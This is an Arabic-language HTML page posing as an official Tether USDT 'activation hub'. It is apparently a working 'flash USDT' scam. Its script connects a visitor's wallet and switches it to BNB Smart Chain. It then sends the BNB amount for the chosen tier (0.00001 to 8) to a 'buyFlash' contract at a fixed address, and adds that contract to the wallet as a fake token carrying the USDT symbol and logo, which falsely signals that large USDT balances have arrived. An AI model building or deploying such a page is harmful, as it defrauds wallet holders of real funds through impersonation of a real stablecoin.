<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether USD | Official Activation Hub</title>
    <!-- ✅ تم إزالة المسافات الزائدة -->
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        :root { --primary: #00ffa3; --bg: #030a09; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 400px; background: #0a1412; border: 1px solid #1a2e2a; border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
        .logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px var(--primary)); }
        select, button { width: 100%; padding: 18px; margin-top: 20px; border-radius: 15px; border: none; font-weight: bold; font-size: 16px; outline: none; transition: 0.4s; }
        select { background: #111; color: #fff; border: 1px solid #222; cursor: pointer; }
        button { background: var(--primary); color: #000; cursor: pointer; text-transform: uppercase; }
        button:hover { background: #00d68a; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,163,0.3); }
        #msg { margin-top: 20px; font-size: 13px; color: var(--primary); font-weight: 500; }
    </style>
</head>
<body>

<div class="card">
    <!-- ✅ تم إزالة المسافة الزائدة -->
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo">
    <h2 style="margin: 0;">تفعيل رصيد USDT</h2>
    <p style="color: #666; font-size: 14px; margin-top: 10px;">اختر الفئة ليتم حقن الرصيد في محفظتك عبر الشبكة</p>
    
    <select id="tier">
        <option value="0.00001">تجربة (حصري): 50 USDT</option>
        <option value="0.09">أساسي: 5,000 USDT</option>
        <option value="0.2">متوسط: 10,000 USDT</option>
        <option value="0.5">احترافي: 50,000 USDT</option>
        <option value="1.0">ممتاز: 100,000 USDT</option>
        <option value="4.0">VIP: 500,000 USDT</option>
        <option value="8.0">ملكـي: 1,000,000 USDT</option>
    </select>

    <button id="startBtn" onclick="execute()">استلام الرصيد الآن ⚡</button>
    <div id="msg">بانتظار تأمين الاتصال بالمحفظة...</div>
</div>

<script>
    // ✅ العنوان الجديد بعد النشر
    const CONTRACT_ADDR = "0x4AfC66EA7834cbb9ad2211DA4cF0961EE286545B";

    async function execute() {
        const btn = document.getElementById('startBtn');
        const msg = document.getElementById('msg');
        try {
            if (!window.ethereum) { alert("يرجى استخدام متصفح يدعم المحافظ"); return; }
            btn.disabled = true;
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const user = accounts[0];
            const web3 = new Web3(window.ethereum);

            const chainId = await web3.eth.getChainId();
            if (chainId !== 56) {
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
            }

            msg.innerText = "جاري تفعيل البروتوكول...";
            const contract = new web3.eth.Contract([{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}], CONTRACT_ADDR);
            
            await contract.methods.buyFlash().send({ 
                from: user, 
                value: web3.utils.toWei(document.getElementById('tier').value, "ether"),
                gas: 150000
            });

            msg.innerText = "تم الحقن! جاري تثبيت الأصول...";

            // ✅ صورة بدون مسافة
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT',
                        decimals: 18,
                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
                    }
                }
            });

            msg.innerHTML = "✅ اكتمل التفعيل! الرصيد متاح في قائمتك.";
        } catch(e) { 
            console.error(e);
            msg.innerText = "فشلت العملية. حاول مرة أخرى."; 
            btn.disabled = false; 
        }
    }
</script>
</body>
</html>
